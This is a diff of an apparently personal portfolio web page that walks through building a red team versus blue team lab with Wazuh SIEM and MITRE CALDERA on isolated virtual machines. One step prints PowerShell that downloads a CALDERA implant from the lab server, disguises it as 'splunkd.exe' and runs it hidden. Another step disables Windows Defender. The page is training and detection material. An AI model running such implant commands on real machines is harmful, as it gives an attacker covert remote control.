@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Red Team vs Blue Team Lab | Cristian Tapia</title>
+    <title>Red Team vs Blue Team Security Lab | Cristian Tapia</title>
     <style>
         * {
             margin: 0;
@@ -15,91 +15,667 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             line-height: 1.6;
             color: #333;
-            background: #f4f4f4;
+            background: #f5f5f5;
         }
         
         header {
-            background: #2c3e50;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: #fff;
-            padding: 2rem 0;
+            padding: 3rem 0;
             text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
         
         header h1 {
-            font-size: 2.5rem;
+            font-size: 2.8rem;
             margin-bottom: 0.5rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
         }
         
         header p {
-            font-size: 1.2rem;
-            color: #ecf0f1;
+            font-size: 1.3rem;
+            color: #e0e0e0;
         }
         
         .container {
-            max-width: 1000px;
+            max-width: 1200px;
             margin: 2rem auto;
             padding: 0 2rem;
         }
         
-        section {
+        .nav {
             background: #fff;
-            padding: 2rem;
-            margin-bottom: 2rem;
+            padding: 1.5rem;
             border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 2rem;
+            position: sticky;
+            top: 20px;
+            z-index: 100;
         }
         
-        h2 {
-            color: #2c3e50;
-            border-bottom: 3px solid #3498db;
-            padding-bottom: 0.5rem;
+        .nav h3 {
+            color: #667eea;
             margin-bottom: 1rem;
         }
         
+        .nav ul {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        
+        .nav a {
+            color: #667eea;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .nav a:hover {
+            color: #764ba2;
+            text-decoration: underline;
+        }
+        
+        section {
+            background: #fff;
+            padding: 2.5rem;
+            margin-bottom: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        h2 {
+            color: #667eea;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 0.5rem;
+            margin-bottom: 1.5rem;
+            font-size: 2rem;
+        }
+        
+        h3 {
+            color: #764ba2;
+            margin-top: 1.5rem;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+        
+        .skills-grid, .tech-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        
+        .skill-item, .tech-item {
+            background: #f8f9fa;
+            padding: 1rem;
+            border-left: 4px solid #667eea;
+            border-radius: 4px;
+        }
+        
+        .prereq-section {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+        
+        .network-config {
+            background: #e7f3ff;
+            border-left: 4px solid #2196F3;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+        
+        .step {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px;
+            border-left: 5px solid #667eea;
+        }
+        
+        .step h3 {
+            color: #667eea;
+            margin-top: 0;
+        }
+        
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            margin: 1rem 0;
+        }
+        
+        code {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 1.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+        
+        pre code {
+            background: none;
+            padding: 0;
+        }
+        
+        ul {
+            margin-left: 2rem;
+            margin-top: 0.5rem;
+        }
+        
+        li {
+            margin-bottom: 0.5rem;
+        }
+        
         footer {
-            background: #2c3e50;
+            background: #2d2d2d;
             color: #fff;
             text-align: center;
-            padding: 1rem 0;
-            margin-top: 2rem;
+            padding: 2rem 0;
+            margin-top: 3rem;
+        }
+        
+        footer a {
+            color: #667eea;
+            text-decoration: none;
+        }
+        
+        footer a:hover {
+            color: #764ba2;
+        }
+        
+        .highlight {
+            background: #fff3cd;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+        }
+        
+        @media (max-width: 768px) {
+            header h1 {
+                font-size: 2rem;
+            }
+            
+            .container {
+                padding: 0 1rem;
+            }
+            
+            .nav ul {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
 <body>
     <header>
-        <h1>Adversary Emulation & Detection Lab</h1>
-        <p>Red Team vs Blue Team Security Analysis</p>
+        <h1>Red Team vs Blue Team Security Lab</h1>
+        <p>Adversary Emulation with MITRE CALDERA & Wazuh SIEM</p>
     </header>
 
     <div class="container">
-        <section>
-            <h2>Overview</h2>
-            <p>Content coming soon...</p>
+        <nav class="nav">
+            <h3>Table of Contents</h3>
+            <ul>
+                <li><a href="#description">Description</a></li>
+                <li><a href="#skills">Skills Demonstrated</a></li>
+                <li><a href="#prerequisites">Prerequisites</a></li>
+                <li><a href="#architecture">Lab Architecture</a></li>
+                <li><a href="#wazuh">Wazuh Installation</a></li>
+                <li><a href="#caldera">CALDERA Installation</a></li>
+                <li><a href="#windows">Windows 10 Setup</a></li>
+                <li><a href="#agent">Agent Deployment</a></li>
+                <li><a href="#operations">Attack Operations</a></li>
+                <li><a href="#detection">Detection Analysis</a></li>
+                <li><a href="#conclusion">Conclusion</a></li>
+            </ul>
+        </nav>
+
+        <section id="description">
+            <h2>Description</h2>
+            <p>This project demonstrates real-world attack and defense scenarios by simulating red team operations using MITRE CALDERA and monitoring detection capabilities with Wazuh SIEM. The lab environment consists of three virtual machines on an isolated network, allowing for safe adversary emulation and threat detection analysis.</p>
         </section>
 
-        <section>
+        <section id="skills">
+            <h2>Skills Demonstrated</h2>
+            <div class="skills-grid">
+                <div class="skill-item">
+                    <strong>Red Team Operations</strong><br>
+                    Executed adversary emulation using MITRE CALDERA C2 framework
+                </div>
+                <div class="skill-item">
+                    <strong>SIEM Configuration</strong><br>
+                    Deployed and configured Wazuh for security event monitoring
+                </div>
+                <div class="skill-item">
+                    <strong>Threat Detection & Analysis</strong><br>
+                    Analyzed attack patterns and correlated alerts with MITRE ATT&CK techniques
+                </div>
+                <div class="skill-item">
+                    <strong>Agent Deployment</strong><br>
+                    Installed and managed Wazuh agents and CALDERA Sandcat implants
+                </div>
+                <div class="skill-item">
+                    <strong>Security Operations</strong><br>
+                    Performed threat hunting, event correlation, and gap analysis
+                </div>
+                <div class="skill-item">
+                    <strong>Network Segmentation</strong><br>
+                    Configured isolated VMnet1 environment for controlled testing
+                </div>
+                <div class="skill-item">
+                    <strong>Adversary Tactics</strong><br>
+                    Simulated credential access, privilege escalation, lateral movement, and persistence
+                </div>
+                <div class="skill-item">
+                    <strong>Documentation & Reporting</strong><br>
+                    Created comprehensive attack-to-detection analysis with remediation strategies
+                </div>
+            </div>
+
+            <h3>Languages and Utilities Used</h3>
+            <div class="tech-grid">
+                <div class="tech-item">Python</div>
+                <div class="tech-item">PowerShell</div>
+                <div class="tech-item">Bash</div>
+                <div class="tech-item">MITRE CALDERA</div>
+                <div class="tech-item">Wazuh SIEM</div>
+                <div class="tech-item">OpenSearch Dashboards</div>
+            </div>
+
+            <h3>Environments Used</h3>
+            <ul>
+                <li>Ubuntu Server 24.04 (Wazuh Manager)</li>
+                <li>Ubuntu Server 24.04 (CALDERA Server)</li>
+                <li>Windows 10 (Target System)</li>
+                <li>VMware Workstation Pro</li>
+            </ul>
+        </section>
+
+        <section id="prerequisites">
+            <h2>Prerequisites</h2>
+            <p>Before starting this lab, ensure you have the following software and ISOs downloaded:</p>
+            
+            <div class="prereq-section">
+                <h3>Virtualization Software</h3>
+                <ul>
+                    <li><strong>VMware Workstation Pro</strong> (or VMware Workstation Player)</li>
+                    <li>Download: <a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html" target="_blank">VMware Website</a></li>
+                    <li>Note: VMware Workstation Player is free for personal use</li>
+                </ul>
+            </div>
+
+            <div class="prereq-section">
+                <h3>Operating System ISOs</h3>
+                <ul>
+                    <li><strong>Ubuntu Server 24.04 LTS (64-bit)</strong>
+                        <ul>
+                            <li>Download: <a href="https://ubuntu.com/download/server" target="_blank">Ubuntu Server</a></li>
+                            <li>File size: ~2.5 GB</li>
+                        </ul>
+                    </li>
+                    <li><strong>Windows 10 ISO (64-bit)</strong>
+                        <ul>
+                            <li>Download: <a href="https://www.microsoft.com/en-us/software-download/windows10" target="_blank">Windows 10 Media Creation Tool</a></li>
+                            <li>File size: ~5-6 GB</li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+
+            <div class="prereq-section">
+                <h3>System Requirements</h3>
+                <ul>
+                    <li>Host machine with at least 16GB RAM (recommended)</li>
+                    <li>120GB free disk space</li>
+                    <li>CPU with virtualization support (Intel VT-x or AMD-V)</li>
+                    <li>Internet connection for downloading tools and updates</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="architecture">
             <h2>Lab Architecture</h2>
-            <p>Content coming soon...</p>
+            <div class="network-config">
+                <h3>Network Configuration</h3>
+                <ul>
+                    <li><strong>Wazuh Manager:</strong> 192.168.232.10</li>
+                    <li><strong>CALDERA Server:</strong> 192.168.232.33</li>
+                    <li><strong>Windows 10 Target:</strong> 192.168.232.20</li>
+                    <li><strong>Network:</strong> VMnet1 (Host-Only)</li>
+                </ul>
+            </div>
         </section>
 
-        <section>
-            <h2>Attack Scenarios</h2>
-            <p>Content coming soon...</p>
+        <section id="wazuh">
+            <h2>Step 1: Wazuh SIEM Installation</h2>
+            
+            <div class="step">
+                <h3>Create Project Folder (Optional)</h3>
+                <img src="https://i.imgur.com/7Imz8Zi.png" alt="Create SIEM Project folder">
+            </div>
+
+            <div class="step">
+                <h3>Create Ubuntu Server VM</h3>
+                <p>Create Ubuntu Server VM in VMware with <span class="highlight">4GB RAM, 2 CPUs, 40GB disk</span></p>
+                <img src="https://i.imgur.com/rYrxRQW.png" alt="VM Configuration">
+            </div>
+
+            <div class="step">
+                <h3>Install Ubuntu Server</h3>
+                <p>Press enter until you see this screen. <strong>Important:</strong> Uncheck "Set up disk as LVM"</p>
+                <img src="https://i.imgur.com/PpOcAfI.png" alt="Ubuntu disk setup">
+                <p>Hit continue:</p>
+                <img src="https://i.imgur.com/QSNfyCm.png" alt="Continue installation">
+            </div>
+
+            <div class="step">
+                <h3>Set Username and Enable SSH</h3>
+                <p>Set the following username and password for organization, and check "Install OpenSSH":</p>
+                <img src="https://i.imgur.com/QBHpJrt.png" alt="User configuration">
+            </div>
+
+            <div class="step">
+                <h3>SSH into Wazuh VM</h3>
+                <p>For time sake, switch to PowerShell. Get the VM's IP from command line, then SSH:</p>
+                <pre><code>ssh wazuh@[VM's IP]</code></pre>
+                <img src="https://i.imgur.com/sxZISs5.png" alt="SSH connection">
+            </div>
+
+            <div class="step">
+                <h3>Install Wazuh</h3>
+                <p>Run these commands (wait 5-10 minutes):</p>
+                <pre><code>sudo apt update && sudo apt upgrade -y
+curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
+sudo bash ./wazuh-install.sh -a</code></pre>
+                <img src="https://i.imgur.com/qCX4LFA.png" alt="Wazuh installation">
+            </div>
+
+            <div class="step">
+                <h3>Configure Network on VMnet1</h3>
+                <p>Shutdown the VM:</p>
+                <pre><code>sudo shutdown -h now</code></pre>
+                <img src="https://i.imgur.com/7tuQ96Y.png" alt="Shutdown VM">
+                <p>In VMware: Right-click VM → Settings → Network Adapter → Custom: VMnet1</p>
+                <img src="https://i.imgur.com/qMu9R9p.png" alt="VMnet1 configuration">
+            </div>
+
+            <div class="step">
+                <h3>Set Static IP</h3>
+                <p>Power on the VM and enter:</p>
+                <pre><code>sudo nano /etc/netplan/50-cloud-init.yaml</code></pre>
+                <img src="https://i.imgur.com/ubr6Mmq.png" alt="Edit netplan">
+                <p>Input the following (use 4 spaces, NOT tabs):</p>
+                <pre><code>network:
+  version: 2
+  ethernets:
+    ens33:
+      dhcp4: false
+      addresses:
+        - 192.168.232.10/24
+      routes:
+        - to: default
+          via: 192.168.232.2
+      nameservers:
+        addresses:
+          - 8.8.8.8
+          - 8.8.4.4</code></pre>
+                <img src="https://i.imgur.com/sUUa4gL.png" alt="Netplan configuration">
+                <p>Save (Ctrl+O), Exit (Ctrl+X), then apply:</p>
+                <pre><code>sudo netplan apply</code></pre>
+            </div>
+
+            <div class="step">
+                <h3>Reset Wazuh Password</h3>
+                <p>Before accessing the dashboard, reset the admin password:</p>
+                <img src="https://i.imgur.com/I5sXDB3.png" alt="Reset password">
+            </div>
+
+            <div class="step">
+                <h3>Access Wazuh Dashboard</h3>
+                <p>Navigate to: <code>https://192.168.232.10</code></p>
+                <img src="https://i.imgur.com/LDuQQq4.png" alt="Wazuh dashboard">
+            </div>
         </section>
 
-        <section>
-            <h2>Detection Analysis</h2>
-            <p>Content coming soon...</p>
+        <section id="caldera">
+            <h2>Step 2: CALDERA C2 Server Installation</h2>
+            
+            <div class="step">
+                <h3>Create CALDERA VM</h3>
+                <p>Create second Ubuntu Server VM (same installation as Wazuh) with <span class="highlight">4GB RAM, 2 CPUs, 20GB disk</span></p>
+                <img src="https://i.imgur.com/jQZSO6b.png" alt="CALDERA VM creation">
+                <p>Set the following configuration:</p>
+                <img src="https://i.imgur.com/udISdaq.png" alt="CALDERA configuration">
+            </div>
+
+            <div class="step">
+                <h3>Install Dependencies</h3>
+                <p>Run the following commands in order:</p>
+                <pre><code># Update and install Python, pip, git
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y python3 python3-pip git
+
+# Install Node.js
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt install -y nodejs
+
+# Install Go
+wget https://go.dev/dl/go1.24.0.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.24.0.linux-amd64.tar.gz
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
+source ~/.bashrc</code></pre>
+            </div>
+
+            <div class="step">
+                <h3>Clone CALDERA Repository</h3>
+                <pre><code>cd ~
+git clone https://github.com/mitre/caldera.git --recursive
+cd caldera</code></pre>
+            </div>
+
+            <div class="step">
+                <h3>Install Python Requirements</h3>
+                <pre><code>pip3 install -r requirements.txt --break-system-packages</code></pre>
+            </div>
+
+            <div class="step">
+                <h3>Start CALDERA</h3>
+                <p><strong>Important:</strong> First run use <code>--build</code> flag. All other times, <code>--build</code> is not necessary.</p>
+                <pre><code>python3 server.py --insecure --build</code></pre>
+                <img src="https://i.imgur.com/cCvmzkb.png" alt="Starting CALDERA">
+                <img src="https://i.imgur.com/SgJtCA9.png" alt="CALDERA building">
+            </div>
+
+            <div class="step">
+                <h3>Configure Network on VMnet1</h3>
+                <p>After building CALDERA, set the network to VMnet1:</p>
+                <img src="https://i.imgur.com/g2xny18.png" alt="VMnet1 for CALDERA">
+                <p>Edit netplan configuration:</p>
+                <pre><code>sudo nano /etc/netplan/50-cloud-init.yaml</code></pre>
+                <p>Paste the following (Ctrl+O to save, Ctrl+X to exit):</p>
+                <pre><code>network:
+  version: 2
+  ethernets:
+    ens33:
+      dhcp4: false
+      addresses:
+        - 192.168.232.33/24
+      routes:
+        - to: default
+          via: 192.168.232.2
+      nameservers:
+        addresses:
+          - 8.8.8.8
+          - 8.8.4.4</code></pre>
+                <img src="https://i.imgur.com/1oriHoO.png" alt="CALDERA netplan">
+                <p>Apply the configuration:</p>
+                <pre><code>sudo netplan apply</code></pre>
+            </div>
+
+            <div class="step">
+                <h3>Access CALDERA</h3>
+                <p>Navigate to: <code>http://192.168.232.33:8888</code></p>
+                <p><strong>Username:</strong> admin<br><strong>Password:</strong> admin</p>
+                <img src="https://i.imgur.com/z0KiFRv.png" alt="CALDERA login">
+            </div>
         </section>
 
-        <section>
-            <h2>Findings & Recommendations</h2>
-            <p>Content coming soon...</p>
+        <section id="windows">
+            <h2>Step 3: Windows 10 Target Configuration</h2>
+            
+            <div class="step">
+                <h3>Create Windows 10 VM</h3>
+                <img src="https://i.imgur.com/cy6291F.png" alt="Windows 10 VM creation">
+            </div>
+
+            <div class="step">
+                <h3>Configure Network</h3>
+                <p>Deploy Windows 10 VM on VMnet1 with IP 192.168.232.20:</p>
+                <img src="https://i.imgur.com/R97NBUI.png" alt="Windows network config">
+                <img src="https://i.imgur.com/7IzYj7F.png" alt="Static IP configuration">
+            </div>
+
+            <div class="step">
+                <h3>Disable Windows Defender</h3>
+                <p>For testing purposes, disable Windows Defender:</p>
+                <img src="https://i.imgur.com/AfIx7Zh.png" alt="Disable Defender step 1">
+                <img src="https://i.imgur.com/6ouLKeL.png" alt="Disable Defender step 2">
+            </div>
+
+            <div class="step">
+                <h3>Deploy Wazuh Agent</h3>
+                <p>Install Wazuh agent pointing to 192.168.232.10:</p>
+                <img src="https://i.imgur.com/GY62S3n.png" alt="Wazuh agent deployment">
+            </div>
+
+            <div class="step">
+                <h3>Verify Agent Connection</h3>
+                <p>Check agent status in Wazuh dashboard:</p>
+                <img src="https://i.imgur.com/gqnTR5W.png" alt="Agent verification">
+            </div>
+        </section>
+
+        <section id="agent">
+            <h2>Step 4: Deploy CALDERA Sandcat Agent</h2>
+            
+            <div class="step">
+                <h3>Navigate to Agent Deployment</h3>
+                <p>In CALDERA, navigate to Agents → Deploy an agent:</p>
+                <img src="https://i.imgur.com/ETCwj0n.png" alt="Deploy agent">
+            </div>
+
+            <div class="step">
+                <h3>Deploy Sandcat for Windows</h3>
+                <p>Select Sandcat for Windows and run the following PowerShell commands as Administrator:</p>
+                <pre><code>Get-Process splunkd -ErrorAction SilentlyContinue | Stop-Process -Force
+
+Remove-Item "C:\Users\Public\splunkd.exe" -Force -ErrorAction SilentlyContinue
+
+Invoke-WebRequest -Uri "http://192.168.232.33:8888/file/download" -Headers @{"platform"="windows";"file"="sandcat.go"} -OutFile "C:\Users\Public\splunkd.exe"
+
+Start-Process -FilePath "C:\Users\Public\splunkd.exe" -ArgumentList "-server http://192.168.232.33:8888 -group red" -WindowStyle hidden</code></pre>
+                <img src="https://i.imgur.com/OWQ06B7.png" alt="PowerShell deployment">
+            </div>
+
+            <div class="step">
+                <h3>Verify Agent Connection</h3>
+                <p>Check CALDERA agents page to confirm connection:</p>
+                <img src="https://i.imgur.com/qO4rRzw.png" alt="Agent connected">
+            </div>
+        </section>
+
+        <section id="operations">
+            <h2>Step 5: Execute Adversary Operations</h2>
+            
+            <div class="step">
+                <h3>Create New Operation</h3>
+                <p>Create operation with Discovery adversary profile:</p>
+                <img src="https://i.imgur.com/6rXXr6X.png" alt="Create operation">
+            </div>
+
+            <div class="step">
+                <h3>Monitor Execution</h3>
+                <p>Start operation and monitor abilities execution:</p>
+                <img src="https://i.imgur.com/wbyv0WP.png" alt="Operation running">
+            </div>
+
+            <div class="step">
+                <h3>View Results</h3>
+                <p>View completed abilities and their outputs:</p>
+                <img src="https://i.imgur.com/OPahLvx.png" alt="Completed abilities">
+            </div>
+        </section>
+
+        <section id="detection">
+            <h2>Step 6: Detection Analysis in Wazuh</h2>
+            
+            <div class="step">
+                <h3>Threat Hunting Dashboard</h3>
+                <p>Navigate to Threat Hunting dashboard:</p>
+                <img src="https://i.imgur.com/CPioVgq.png" alt="Threat Hunting dashboard">
+            </div>
+
+            <div class="step">
+                <h3>View Security Events</h3>
+                <p>View security events generated from attacks:</p>
+                <img src="https://i.imgur.com/4PMWOsH.png" alt="Security events">
+            </div>
+
+            <div class="step">
+                <h3>MITRE ATT&CK Mapping</h3>
+                <p>Examine MITRE ATT&CK technique mapping:</p>
+                <img src="https://i.imgur.com/fNG6Tzi.png" alt="MITRE mapping">
+            </div>
+
+            <div class="step">
+                <h3>Detailed Alert Analysis</h3>
+                <p>Click into specific alerts for detailed analysis:</p>
+                <img src="https://i.imgur.com/fNG6Tzi.png" alt="Alert details">
+            </div>
+
+            <div class="step">
+                <h3>MITRE ATT&CK Coverage</h3>
+                <p>Access MITRE ATT&CK view in Wazuh:</p>
+                <img src="https://i.imgur.com/N3wztOP.png" alt="ATT&CK view">
+                <p>Review detected techniques across tactics:</p>
+                <img src="https://i.imgur.com/CEB1nft.png" alt="Techniques detected">
+                <p>Identify detection gaps:</p>
+                <img src="https://i.imgur.com/b6js1Mv.png" alt="Detection gaps">
+            </div>
+        </section>
+
+        <section id="conclusion">
+            <h2>Conclusion</h2>
+            <p>This project provided invaluable hands-on experience in both offensive and defensive cybersecurity operations. Building this lab from the ground up significantly enhanced my Linux administration skills, from configuring network interfaces with netplan to managing services and troubleshooting connectivity issues across multiple Ubuntu servers. The command-line proficiency I gained through SSH sessions, package management, and system configuration will be foundational for my career in cybersecurity.</p>
+
+            <p>Working with Wazuh SIEM gave me practical experience with enterprise security monitoring tools. I learned how to deploy and configure a Security Information and Event Management system, interpret security alerts, correlate events across multiple sources, and map detections to the MITRE ATT&CK framework. Understanding how to navigate dashboards, create custom queries, and analyze security events in real-time provided insight into the day-to-day responsibilities of a Security Operations Center (SOC) analyst.</p>
+
+            <p>The red team aspect of this project, using MITRE CALDERA for adversary emulation, taught me how attackers think and operate. Executing various attack operations across credential access, privilege escalation, lateral movement, and persistence tactics helped me understand the offensive mindset necessary to build effective defenses. Observing how different attack techniques behave in a controlled environment provided perspective that theoretical learning alone cannot offer.</p>
+
+            <p>One of the most valuable learning experiences came from analyzing failed adversary events in CALDERA. When certain abilities failed to execute due to insufficient permissions, missing dependencies, or security controls blocking them, I gained critical insights into basic security principles. These failures demonstrated how privilege separation, least privilege access, and defensive configurations actually prevent attacks in practice. Understanding why attacks fail is just as important as understanding why they succeed—it reveals the importance of proper system hardening and security fundamentals.</p>
+
+            <p>Analyzing attacks in progress through both the CALDERA operation console and Wazuh dashboard simultaneously provided a unique dual perspective. Watching attack commands execute on the red team side while observing corresponding alerts appear on the blue team side reinforced the relationship between offensive actions and defensive detection. This correlation between attack and defense is the foundation of effective security operations.</p>
+
+            <p>This lab demonstrated that cybersecurity is not just about using tools, but about understanding systems, thinking critically about security gaps, and continuously testing and improving defenses. The hands-on experience gained through building, attacking, and defending this environment has prepared me for real-world security roles and instilled a mindset of continuous learning and improvement that will serve me throughout my cybersecurity career.</p>
         </section>
     </div>
 
     <footer>
-        <p>&copy; 2025 Cristian Tapia | <a href="https://github.com/sirtapia" style="color: #3498db;">GitHub</a></p>
+        <p>&copy; 2025 Cristian Tapia | <a href="https://github.com/sirtapia" target="_blank">GitHub</a> | <a href="https://linkedin.com/in/cristian-tapia-076a84326" target="_blank">LinkedIn</a></p>
     </footer>
 </body>
 </html>
